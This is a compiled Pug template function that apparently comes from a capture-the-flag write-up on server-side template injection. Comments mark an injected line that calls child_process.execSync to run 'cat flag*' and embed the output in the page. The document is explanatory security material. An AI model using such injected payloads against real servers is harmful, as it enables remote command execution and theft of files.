function template(locals) {
    var pug_html = "",
        pug_mixins = {},
        pug_interp;
    var pug_debug_filename, pug_debug_line;
    try {
        ;
        var locals_for_with = (locals || {});

        (function (process, user) {
            ;
            pug_debug_line = 1;
            pug_html = pug_html + "\u003Cspan\u003E";

            // 這部分是注入的程式碼
            1;
            pug_html += `[${process.mainModule.require('child_process').execSync(`cat flag*`).toString()}]`;
            // 這部分是注入的程式碼

            ;
            pug_debug_line = 1;
            pug_html = pug_html + "Hello ";;
            pug_debug_line = 1;
            pug_html = pug_html + (pug.escape(null == (pug_interp = user) ? "" : pug_interp));;
            pug_debug_line = 1;
            pug_html = pug_html + ", thank you for letting us know!\u003C\u002Fspan\u003E";
        }.call(this, "process" in locals_for_with ?
            locals_for_with.process :
            typeof process !== 'undefined' ? process : undefined, "user" in locals_for_with ?
            locals_for_with.user :
            typeof user !== 'undefined' ? user : undefined));;
    } catch (err) {
        pug.rethrow(err, pug_debug_filename, pug_debug_line);
    };
    return pug_html;
}